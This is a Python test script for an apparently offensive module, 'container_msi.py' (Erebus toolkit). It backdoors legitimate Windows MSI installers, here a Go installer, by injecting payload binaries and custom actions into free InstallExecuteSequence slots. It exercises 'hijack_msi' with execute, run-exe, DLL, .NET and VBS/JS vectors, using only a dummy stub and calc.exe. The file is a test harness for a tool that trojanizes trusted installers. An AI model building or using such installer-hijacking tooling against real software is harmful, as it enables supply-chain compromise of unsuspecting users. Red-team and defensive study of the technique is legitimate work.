"""
Quick smoke-test for container_msi.py against a real MSI file.
Tests the InstallerDatabase wrapper, table reading, sequence-slot finding,
and the hijack_msi flow (on Windows via msilib).
"""

import pathlib
import sys
import shutil
import tempfile
import traceback

# Import from archive directory (parent of tests)
sys.path.insert(0, str(pathlib.Path(__file__).parent.parent / "archive"))

import container_msi as cm

TEST_MSI = pathlib.Path(r"D:\CyberSecurity\SharedDisk\temp\go1.26.0.windows-amd64.msi")
BUILD_DIR = pathlib.Path(tempfile.mkdtemp(prefix="erebus_msi_test_"))

passed = 0
failed = 0

def report(name, ok, detail=""):
    global passed, failed
    if ok:
        passed += 1
        print(f"  [PASS] {name}")
    else:
        failed += 1
        print(f"  [FAIL] {name}  -- {detail}")


print(f"\n{'='*60}")
print(f"  container_msi.py smoke-test")
print(f"  MSI under test : {TEST_MSI}")
print(f"  Temp build dir : {BUILD_DIR}")
print(f"{'='*60}\n")

# -----------------------------------------------------------------------
# 1. InstallerDatabase — open read-only and scan tables
# -----------------------------------------------------------------------
print("[1] InstallerDatabase read-only open + table scan")
try:
    db = cm.InstallerDatabase(str(TEST_MSI), writable=False)

    # Read InstallExecuteSequence
    ies_rows = db.read_table("InstallExecuteSequence")
    report("read InstallExecuteSequence", len(ies_rows) > 0,
           f"got {len(ies_rows)} rows")

    # Read File table
    file_rows = db.read_table("File")
    report("read File table", len(file_rows) > 0,
           f"got {len(file_rows)} rows")

    # Read Feature table
    feat_rows = db.read_table("Feature")
    report("read Feature table", len(feat_rows) > 0,
           f"got {len(feat_rows)} rows")

    # Read Media table
    media_rows = db.read_table("Media")
    report("read Media table", len(media_rows) > 0,
           f"got {len(media_rows)} rows")

    # Read Component table
    comp_rows = db.read_table("Component")
    report("read Component table", len(comp_rows) > 0,
           f"got {len(comp_rows)} rows")

    # Read Directory table
    dir_rows = db.read_table("Directory")
    report("read Directory table", len(dir_rows) > 0,
           f"got {len(dir_rows)} rows")

    db.abandon()
    report("abandon (close without commit)", True)
except Exception as e:
    report("InstallerDatabase read-only", False, f"{e}\n{traceback.format_exc()}")

# -----------------------------------------------------------------------
# 1b. Dump table contents from the SOURCE MSI
# -----------------------------------------------------------------------
print("\n[1b] Source MSI table dump")
try:
    db = cm.InstallerDatabase(str(TEST_MSI), writable=False)

    # -- Directory tree --
    dir_rows = db.read_table("Directory")
    print(f"\n  ── Directory table ({len(dir_rows)} entries) ──")
    print(f"  {'ID':<30s} {'Parent':<30s} {'DefaultDir'}")
    print(f"  {'─'*30} {'─'*30} {'─'*30}")
    for r in dir_rows:
        print(f"  {str(r[0]):<30s} {str(r[1] or ''):<30s} {r[2] if len(r)>2 else ''}")

    # -- Feature list --
    feat_rows = db.read_table("Feature")
    print(f"\n  ── Feature table ({len(feat_rows)} entries) ──")
    print(f"  {'ID':<25s} {'Parent':<20s} {'Title':<30s} Lvl")
    print(f"  {'─'*25} {'─'*20} {'─'*30} {'─'*4}")
    for r in feat_rows:
        print(f"  {str(r[0]):<25s} {str(r[1] or ''):<20s} {str(r[2] or ''):<30s} {r[5] if len(r)>5 else '?'}")

    # -- Component → Directory mapping --
    comp_rows = db.read_table("Component")
    print(f"\n  ── Component table ({len(comp_rows)} entries) ──")
    print(f"  {'Component':<30s} {'GUID':<40s} {'Directory':<25s} KeyPath")
    print(f"  {'─'*30} {'─'*40} {'─'*25} {'─'*20}")
    for r in comp_rows[:30]:  # cap at 30 to avoid flooding
        print(f"  {str(r[0]):<30s} {str(r[1] or ''):<40s} {str(r[2] or ''):<25s} {r[5] if len(r)>5 else ''}")
    if len(comp_rows) > 30:
        print(f"  ... and {len(comp_rows)-30} more")

    # -- File table — every file that gets installed (payload paths) --
    file_rows = db.read_table("File", sort=False)
    print(f"\n  ── File table ({len(file_rows)} entries) ──")
    print(f"  {'FileID':<25s} {'Component':<25s} {'FileName':<40s} {'Size':>10s}  Seq")
    print(f"  {'─'*25} {'─'*25} {'─'*40} {'─'*10}  {'─'*5}")
    for r in file_rows[:50]:
        fname = r[2] if len(r)>2 else "?"
        fsize = r[3] if len(r)>3 else "?"
        fseq  = r[7] if len(r)>7 else "?"
        print(f"  {str(r[0]):<25s} {str(r[1]):<25s} {str(fname):<40s} {str(fsize):>10s}  {fseq}")
    if len(file_rows) > 50:
        print(f"  ... and {len(file_rows)-50} more files")

    # -- Media table --
    media_rows = db.read_table("Media")
    print(f"\n  ── Media table ({len(media_rows)} entries) ──")
    print(f"  {'DiskId':>6s}  {'LastSeq':>8s}  Cabinet")
    print(f"  {'─'*6}  {'─'*8}  {'─'*30}")
    for r in media_rows:
        print(f"  {str(r[0]):>6s}  {str(r[1]):>8s}  {r[3] if len(r)>3 else ''}")

    # -- InstallExecuteSequence --
    ies_rows = db.read_table("InstallExecuteSequence")
    print(f"\n  ── InstallExecuteSequence ({len(ies_rows)} entries) ──")
    print(f"  {'Seq':>6s}  {'Action':<35s} Condition")
    print(f"  {'─'*6}  {'─'*35} {'─'*30}")
    for r in ies_rows:
        seq  = r[2] if len(r)>2 else "?"
        cond = r[1] if len(r)>1 else ""
        print(f"  {str(seq):>6s}  {str(r[0]):<35s} {cond or ''}")

    # -- CustomAction (if present) --
    try:
        ca_rows = db.read_table("CustomAction")
        print(f"\n  ── CustomAction table ({len(ca_rows)} entries) ──")
        print(f"  {'Action':<25s} {'Type':>6s}  {'Source':<25s} Target")
        print(f"  {'─'*25} {'─'*6}  {'─'*25} {'─'*30}")
        for r in ca_rows:
            t = r[1] if len(r)>1 else "?"
            s = r[2] if len(r)>2 else ""
            tgt = r[3] if len(r)>3 else ""
            print(f"  {str(r[0]):<25s} {str(t):>6s}  {str(s):<25s} {str(tgt)[:60]}")
    except Exception:
        print("\n  ── CustomAction table: not present ──")

    # -- Binary table (streams / embedded payloads) --
    try:
        bin_rows = db.read_table("Binary")
        print(f"\n  ── Binary table ({len(bin_rows)} entries) ──")
        for r in bin_rows:
            print(f"  Name: {r[0]}")
    except Exception:
        print("\n  ── Binary table: not present ──")

    # -- Registry table (if present) --
    try:
        reg_rows = db.read_table("Registry")
        print(f"\n  ── Registry table ({len(reg_rows)} entries) ──")
        print(f"  {'Registry':<20s} {'Root':>4s}  {'Key':<50s} Name")
        print(f"  {'─'*20} {'─'*4}  {'─'*50} {'─'*20}")
        for r in reg_rows[:20]:
            print(f"  {str(r[0]):<20s} {str(r[1]):>4s}  {str(r[2]):<50s} {r[3] if len(r)>3 else ''}")
        if len(reg_rows) > 20:
            print(f"  ... and {len(reg_rows)-20} more")
    except Exception:
        print("\n  ── Registry table: not present ──")

    # -- Property table (product metadata) --
    try:
        prop_rows = db.read_table("Property")
        print(f"\n  ── Property table ({len(prop_rows)} entries) ──")
        for r in prop_rows:
            print(f"  {str(r[0]):<30s} = {str(r[1])[:80] if len(r)>1 else ''}")
    except Exception:
        print("\n  ── Property table: not present ──")

    db.abandon()

except Exception as e:
    print(f"  [!] Table dump failed: {e}\n{traceback.format_exc()}")

# -----------------------------------------------------------------------
# 2. Locate free sequence slots
# -----------------------------------------------------------------------
print("\n[2] Sequence-slot discovery")
try:
    db = cm.InstallerDatabase(str(TEST_MSI), writable=False)

    slots = db.locate_free_slots(
        "InstallExecuteSequence", "InstallInitialize", "InstallFinalize"
    )
    report("locate_free_slots (InstallInit → InstallFinal)",
           isinstance(slots, list) and len(slots) > 0,
           f"found {len(slots)} free slots, first={slots[0] if slots else '?'}")

    cost_slots = db.locate_free_slots(
        "InstallExecuteSequence", "CostInitialize", "FileCost"
    )
    report("locate_free_slots (CostInit → FileCost)",
           isinstance(cost_slots, list) and len(cost_slots) > 0,
           f"found {len(cost_slots)} free slots")

    db.abandon()
except Exception as e:
    report("sequence-slot discovery", False, f"{e}\n{traceback.format_exc()}")

# -----------------------------------------------------------------------
# 3. Helper functions
# -----------------------------------------------------------------------
print("\n[3] Helper functions")

tag = cm._rand_tag(8, 16)
report("_rand_tag(8,16)", len(tag) >= 8 and tag[0].isalpha(),
       f"tag={tag!r}")

normalised = cm._normalise_tag("My File (1).exe")
report("_normalise_tag", "_" not in normalised or normalised.replace("_","").replace(".","").isalnum(),
       f"result={normalised!r}")

# CLR probe on a non-.NET file (the MSI itself should return False)
clr = cm._probe_clr_header(str(TEST_MSI))
report("_probe_clr_header on non-PE", clr is False, f"returned {clr}")

# -----------------------------------------------------------------------
# 4. _resolve_vector for each attack type
# -----------------------------------------------------------------------
print("\n[4] Attack vector resolution")

for atype, expected_code in [
    ("execute",   cm.PackagerActionCodes.DEFERRED_IMPERSONATED),
    ("run-exe",   cm.PackagerActionCodes.BINARY_EXE),
    ("load-dll",  cm.PackagerActionCodes.DLL_ENTRYPOINT),
    ("dotnet",    cm.PackagerActionCodes.DLL_ENTRYPOINT),
]:
    code, tgt = cm._resolve_vector("dummy.exe", atype, "MyEntry", "args")
    report(f"_resolve_vector({atype!r})", code == expected_code,
           f"got code={code}, expected={expected_code}")

for ext, expected_code in [(".vbs", cm.PackagerActionCodes.BINARY_VBS),
                            (".js",  cm.PackagerActionCodes.BINARY_JS)]:
    code, tgt = cm._resolve_vector(f"script{ext}", "script", "Main", "")
    report(f"_resolve_vector(script {ext})", code == expected_code,
           f"got code={code}")

# -----------------------------------------------------------------------
# 5. hijack_msi — full integration (creates a patched copy)
# -----------------------------------------------------------------------
print("\n[5] hijack_msi integration test")
try:
    # Create a tiny dummy payload (just a few bytes — won't run, but tests the MSI plumbing)
    payload_dir = BUILD_DIR / "payload"
    payload_dir.mkdir(parents=True, exist_ok=True)
    dummy_payload = payload_dir / "dummy_payload.exe"
    dummy_payload.write_bytes(b"MZ" + b"\x00" * 510)  # minimal stub

    patched = cm.hijack_msi(
        source_msi=TEST_MSI,
        payload_path=dummy_payload,
        build_path=BUILD_DIR,
        attack_type="execute",
        command_args="calc.exe",
    )

    report("hijack_msi returned a path", patched is not None and patched.exists(),
           f"path={patched}")
    report("patched file size > source",
           patched.stat().st_size >= TEST_MSI.stat().st_size,
           f"src={TEST_MSI.stat().st_size}, patched={patched.stat().st_size}")

    # Verify the patched MSI is readable and our action is present
    db2 = cm.InstallerDatabase(str(patched), writable=False)
    ies2 = db2.read_table("InstallExecuteSequence")
    actions = [r[0] for r in ies2]
    # We don't know the random CA name, but there should be more actions
    # than the original
    report("patched MSI has extra sequence entry",
           len(ies2) > len(ies_rows),
           f"original={len(ies_rows)}, patched={len(ies2)}")
    db2.abandon()

    # Dump the injected entries in the patched MSI
    print("\n  ── Patched MSI diff dump ──")
    db2 = cm.InstallerDatabase(str(patched), writable=False)

    p_ies = db2.read_table("InstallExecuteSequence")
    orig_actions = {r[0] for r in ies_rows}
    new_actions = [r for r in p_ies if r[0] not in orig_actions]
    if new_actions:
        print(f"  New InstallExecuteSequence entries:")
        for r in new_actions:
            print(f"    Seq={r[2]}  Action={r[0]}  Condition={r[1] or ''}")
    else:
        print(f"  (no new sequence entries detected)")

    try:
        p_ca = db2.read_table("CustomAction")
        print(f"  CustomAction table ({len(p_ca)} entries):")
        for r in p_ca:
            t = r[1] if len(r)>1 else "?"
            s = r[2] if len(r)>2 else ""
            tgt = r[3] if len(r)>3 else ""
            print(f"    Action={r[0]}  Type={t}  Source={s}  Target={str(tgt)[:80]}")
    except Exception:
        print(f"  (CustomAction table not readable)")

    try:
        p_bin = db2.read_table("Binary")
        print(f"  Binary table ({len(p_bin)} entries):")
        for r in p_bin:
            print(f"    Name={r[0]}")
    except Exception:
        print(f"  (Binary table not readable)")

    db2.abandon()

except Exception as e:
    report("hijack_msi integration", False, f"{e}\n{traceback.format_exc()}")

# -----------------------------------------------------------------------
# 6. hijack_msi — run-exe vector
# -----------------------------------------------------------------------
print("\n[6] hijack_msi run-exe vector")
try:
    patched_exe = cm.hijack_msi(
        source_msi=TEST_MSI,
        payload_path=dummy_payload,
        build_path=BUILD_DIR,
        custom_action_name="TestRunExe",
        attack_type="run-exe",
        command_args="",
    )
    report("run-exe hijack succeeded", patched_exe is not None and patched_exe.exists())

    db3 = cm.InstallerDatabase(str(patched_exe), writable=False)
    ies3 = db3.read_table("InstallExecuteSequence")
    found = any(r[0] == "TestRunExe" for r in ies3)
    report("TestRunExe action present in sequence", found,
           f"actions={[r[0] for r in ies3[-5:]]}")

    # Dump run-exe patched MSI tables
    print(f"\n  ── Run-EXE patched MSI tables ──")
    try:
        ca3 = db3.read_table("CustomAction")
        for r in ca3:
            t = r[1] if len(r)>1 else "?"
            s = r[2] if len(r)>2 else ""
            tgt = r[3] if len(r)>3 else ""
            print(f"    CA: Action={r[0]}  Type={t}  Source={s}  Target={str(tgt)[:80]}")
    except Exception:
        pass
    try:
        bin3 = db3.read_table("Binary")
        for r in bin3:
            print(f"    Binary: Name={r[0]}")
    except Exception:
        pass

    db3.abandon()

except Exception as e:
    report("run-exe hijack", False, f"{e}\n{traceback.format_exc()}")

# -----------------------------------------------------------------------
# 7. Legacy aliases still work
# -----------------------------------------------------------------------
print("\n[7] Legacy alias compatibility")
report("ErebusActionTypes alias", cm.ErebusActionTypes is cm.PackagerActionCodes)
report("ErebusInstallerToolkit.generate_identifier",
       callable(cm.ErebusInstallerToolkit.generate_identifier))
report("ErebusInstallerToolkit.sanitize_identifier",
       callable(cm.ErebusInstallerToolkit.sanitize_identifier))
report("ErebusInstallerToolkit.detect_dotnet_assembly",
       callable(cm.ErebusInstallerToolkit.detect_dotnet_assembly))
report("ErebusInstallerToolkit.find_free_sequence_slots",
       callable(cm.ErebusInstallerToolkit.find_free_sequence_slots))

# -----------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------
print(f"\n{'='*60}")
print(f"  Results: {passed} passed, {failed} failed")
print(f"  Temp dir: {BUILD_DIR}")
print(f"{'='*60}\n")

# Cleanup
# try:
#     shutil.rmtree(BUILD_DIR)
#     print("  (temp dir cleaned up)")
# except Exception:
#     print(f"  (could not clean up {BUILD_DIR})")

sys.exit(0 if failed == 0 else 1)
